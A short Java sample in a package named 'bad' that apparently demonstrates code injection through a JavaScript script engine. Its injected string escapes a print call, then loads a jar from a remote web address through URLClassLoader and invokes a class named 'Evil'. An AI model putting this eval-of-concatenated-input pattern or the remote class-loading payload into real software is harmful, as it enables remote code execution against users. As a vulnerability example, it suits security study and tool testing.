package bad;

import java.lang.annotation.Annotation;
import javax.script.*;

public class CodeInjectionFieldRead {
		
	public static final String injection = "Everything beyond here has been injected via the JavaScript engine;');\n"
	 		+ "var File = Java.type('java.io.File');\n"
//	 		+ "print(new File('/').list());"
			+ "print(new File('.').getAbsolutePath());\n"
			+ "var URLClassLoader = Java.type('java.net.URLClassLoader');\n"
			//+ "var loader = new URLClassLoader(new Array(new File('malware').toURI().toURL()));\n"
			+ "var loader = new URLClassLoader(new Array(new java.net.URL('https://www.uni-koblenz.de/~speldszus/example.jar')));\n"
			+ "var clazz = loader.loadClass('example.Evil');\n"
			+ "clazz.getDeclaredMethod('invokeEvilFieldRead').invoke(clazz.newInstance());\n"
			+ "loader.close();\n"
			+ "//";

	public static void main(String[] args) {
//		System.setSecurityManager(new SecurityManager());
		for(Annotation a : a(new Annotation[0])) {
			System.out.println(a.annotationType());
		}
		try {
			ScriptEngineManager manager = new ScriptEngineManager();
			ScriptEngine engine = manager.getEngineByName("JavaScript");
			engine.eval("print('" + injection + "')");
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static Annotation[] a(Annotation[] s) {
		return CodeInjectionFieldRead.class.getAnnotations();
	}
}
